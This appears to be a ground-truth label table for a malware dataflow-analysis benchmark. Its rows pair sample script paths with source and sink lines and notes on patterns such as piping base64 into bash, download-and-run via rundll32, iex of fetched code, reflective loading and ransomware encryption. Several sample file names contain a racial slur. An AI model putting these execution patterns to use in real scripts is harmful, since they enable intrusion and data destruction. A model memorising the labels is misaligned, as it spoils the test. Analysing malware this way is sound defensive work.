+/mnt/games/kofsurvey/sc_fam/f1000	33	data-decode	33	proc-start	must	pipe: echo b64 | base64 -d | bash (33)
+/mnt/games/kofsurvey/sc_fam/f1000	34	data-decode	34	proc-start	must	pipe: echo b64 | base64 -d | bash (34)
+/mnt/games/kofsurvey/sc_fam/f1000	31	data-decode	31	proc-start	shared	base64 -d > /tmp/test.sh; bash /tmp/test.sh (31)
+/mnt/games/kofsurvey/sc_fam/f1000	32	data-decode	32	proc-start	shared	base64 -d > /var/spool/asterisk/tmp/test.sh; bash same path (32)
+/mnt/games/kofsurvey/sc_fam/f1000	3	data-decode	28	file-perm-set	shared	base64 -d > /var/www/html/admin/views/ajax.php (3); chmod +x same path (28)
+/mnt/games/normtest/wire_b/corp/smp/ps1/0001_stage2.ps1	1	http-fetch	1	proc-start	shared	IWR (name built by -f format, line 1) -outf $env:USERPROFILE\AppData\runner.dll then rundll32 same path; path not a plain literal (env var), both on line 1
+/mnt/games/normtest/wire_b/corp/smp/ps1/0002_1.ps1	0	-	0	-	none	WebClient.DownloadFile lines 8,20 write to files but no node consumes them; Copyhere is shell.application COM, not a row
+/mnt/games/normtest/wire_b/corp/smp/ps1/0003_cs.ps1	0	-	0	-	none	only FromBase64String of a literal (line 1); no sink in file
+/mnt/games/normtest/wire_b/corp/smp/ps1/0004_onenoteDRAX2.ps1	2	data-decode	3	data-load	must	file is 3MB; $payload (line 1) -> FromBase64String -> $tk (line 2) -> [Reflection.Assembly]::Load($tk) line 3
+/mnt/games/normtest/wire_b/corp/smp/ps1/0005_green.ps1	0	-	0	-	none	FromBase64String lines 11,18 only feed object properties; no second node
+/mnt/games/normtest/wire_b/corp/smp/ps1/0006_black.ps1	0	-	0	-	none	FromBase64String lines 2,7 and WebClient line 16; no node argument receives a node result
+/mnt/games/normtest/wire_b/corp/smp/ps1/0007_olive.ps1	13	http-fetch	15	data-eval	may	(Get-Webclient -Cookie $pp).downloadstring($script:s) line 13 -> $primern -> dec line 14 (function defined elsewhere) -> $p | iex line 15
+/mnt/games/normtest/wire_b/corp/smp/ps1/0008_hello.ps1	6	http-fetch	9	file-write	must	$data=$wc.DownloadData($url) line 6 -> [io.file]::WriteAllBytes(path,$data) line 9
+/mnt/games/normtest/wire_b/corp/smp/ps1/0008_hello.ps1	9	file-write	10	proc-start	shared	path "C:\Users\Public\splunkd.exe" written line 9 then Start-Process -FilePath same path line 10
+/mnt/games/normtest/wire_b/corp/smp/ps1/0009_Invoke-Ransom.ps1	66	file-open	78	file-write	may	$plainBytes=ReadAllBytes line 66 -> TransformFinalBlock (object member) -> $encryptedBytes -> WriteAllBytes($outPath,$encryptedBytes) line 78
+/mnt/games/normtest/wire_b/corp/smp/ps1/0009_Invoke-Ransom.ps1	93	file-open	105	file-write	may	$cipherBytes=ReadAllBytes line 93 -> TransformFinalBlock (object member) -> $decryptedBytes -> WriteAllBytes line 105
+/mnt/games/normtest/wire_b/corp/smp/ps1/0009_Invoke-Ransom.ps1	85	data-decode	105	file-write	may	$cipherBytes=FromBase64String($Text) line 85 -> TransformFinalBlock (member) -> $decryptedBytes -> WriteAllBytes line 105 (Text branch actually returns, path is set in other branch)
+/mnt/games/normtest/wire_b/corp/smp/ps1/0010_Ransomware-Exodus.ps1	22	data-decode	15	file-write	may	DecryptFileContent returns FromBase64String result (22) -> DecryptFile line 79 -> SetDecryptedFileContent line 80 -> WriteAllBytes line 15; through three file functions
+/mnt/games/normtest/graph_research/work2/scripts/bat/002_python.bat	2	proc-start	6	proc-start	shared	powershell curl ... -o C:\users\public\videos\python.zip (line 2) then powershell Expand-Archive of "C:\users\public\videos\python.zip" (line 6); same constant path
+/mnt/games/normtest/wire_b/corp/smp/bat/0001_python.bat	2	proc-start	6	proc-start	shared	powershell curl ... -o C:\users\public\videos\python.zip (line 2) then powershell Expand-Archive of "C:\users\public\videos\python.zip" (line 6); same constant path
+/mnt/games/normtest/graph_research/work2/scripts/bat/003_unzip.bat	0	-	0	-	none	single node: cscript line 19; the vbs it runs is made by echo lines, which are not nodes
+/mnt/games/normtest/wire_b/corp/smp/bat/0002_unzip.bat	0	-	0	-	none	single node: cscript line 19; the vbs it runs is made by echo lines, which are not nodes
+/mnt/games/normtest/graph_research/work2/scripts/bat/000_gradlew.bat	0	-	0	-	none	java launcher via %JAVA_EXE% (lines 23,69) only; no node result reaches another
+/mnt/games/normtest/wire_b/corp/smp/bat/0003_gradlew.bat	0	-	0	-	none	java launcher via %JAVA_EXE% (lines 23,69) only; no node result reaches another
+/mnt/games/normtest/graph_research/work2/scripts/bat/001_mkgvmt32.bat	0	-	0	-	none	one assembler command (ml), not in table
+/mnt/games/normtest/wire_b/corp/smp/bat/0004_mkgvmt32.bat	0	-	0	-	none	one assembler command (ml), not in table
+/mnt/games/normtest/graph_research/work2/scripts/bat/004_.diamorphine.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/005_.diamorphine.mod.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/006_.modules.order.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/007_.Module.symvers.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/008_.diamorphine.mod.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/009_.diamorphine.ko.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/010_.diamondxe.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/011_.diamondxe.mod.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/012_.modules.order.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/013_.Module.symvers.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/014_.diamondxe.mod.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/015_..module-common.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/bat/016_.diamondxe.ko.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0001_.diamorphine.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0002_.diamorphine.mod.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0003_.modules.order.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0004_.Module.symvers.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0005_.diamorphine.mod.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0006_.diamorphine.ko.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0007_.diamondxe.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0008_.diamondxe.mod.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0009_.modules.order.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0010_.Module.symvers.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0011_.diamondxe.mod.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0012_..module-common.o.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/wire_b/corp/smp/cmd/0013_.diamondxe.ko.cmd	0	-	0	-	none	kbuild .cmd dependency file (gcc/ld/printf/awk command lines), not a batch script; no table command in command position
+/mnt/games/normtest/graph_research/work2/scripts/vbs/000_Stork.vbs	0	-	0	-	none	one node: WScript.Shell.Run line 342 running powershell with a script built from string pieces (T0); no node result reaches it
+/mnt/games/normtest/graph_research/work2/scripts/vbs/001_Blotlg1NOUSE.vbs	0	-	0	-	none	one node: WScript.Shell.Run line 334 with a PowerShell script built from string pieces; no second node
+/mnt/games/normtest/graph_research/work2/scripts/vbs/002_Vejlensisk90.vbs	0	-	0	-	none	one node: WScript.Shell.Run line 334 with a PowerShell script built from string pieces; no second node
+/mnt/games/normtest/graph_research/work2/scripts/vbs/003_rem.vbs	37	data-eval	84	data-eval	may	Eval(Chr(&H..Mid)) in FiERUuAVDKtAlEq line 37 builds the hex-decoded string returned to Eval("qWoAzNg()."+FiERUuAVDKtAlEq(...)) line 84; through user function
+/mnt/games/normtest/graph_research/work2/scripts/vbs/003_rem.vbs	37	data-eval	99	data-eval	may	FiERUuAVDKtAlEq (Eval line 37) decodes "WScript.ScriptName" in nHBG line 133, which is the argument of Eval(nHBG()) line 99; through user functions
+/mnt/games/normtest/graph_research/work2/scripts/vbs/004_Protected_Client.vbs	74	data-eval	8	data-eval	may	ezpSCUL hex decoder builds its result with Execute line 74; used by uNIX (line 89) = argument of Eval(uNIX()) line 8
+/mnt/games/normtest/graph_research/work2/scripts/vbs/004_Protected_Client.vbs	74	data-eval	18	data-eval	may	ezpSCUL result (Execute line 74) is part of mGGK() (line 68) which is the argument of Execute(mGGK()) line 18; hidden ShellExecute inside that text not established
+/mnt/games/normtest/graph_research/work2/scripts/vbs/005_yz.vbs	0	-	0	-	none	form validation in VBScript, no table name
+/mnt/games/normtest/wire_b/corp/smp/hta/0001_fuck_niggers_30.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0002_fuck_niggers_36.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0003_fuck_niggers_48.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0004_fuck_niggers_14.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0005_fuck_niggers_8.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0006_fuck_niggers_24.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0007_fuck_niggers_49.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0008_fuck_niggers_29.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0009_fuck_niggers_47.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0010_fuck_niggers_6.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0011_fuck_niggers_37.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0012_fuck_niggers_27.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0013_fuck_niggers_22.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0014_fuck_niggers_5.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0015_fuck_niggers_19.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0016_fuck_niggers_4.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0017_fuck_niggers_3.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
+/mnt/games/normtest/wire_b/corp/smp/hta/0018_fuck_niggers_9.hta	39	file-write	44	proc-start	shared	CreateTextFile(path) line 39 writes "C:\ProgramData\fuck_all_niggers.vbs" (line 33), then WScript.Shell.Run "wscript.exe C:\ProgramData\fuck_all_niggers.vbs" line 44 (ProgIDs spelled with Chr/concat, read)
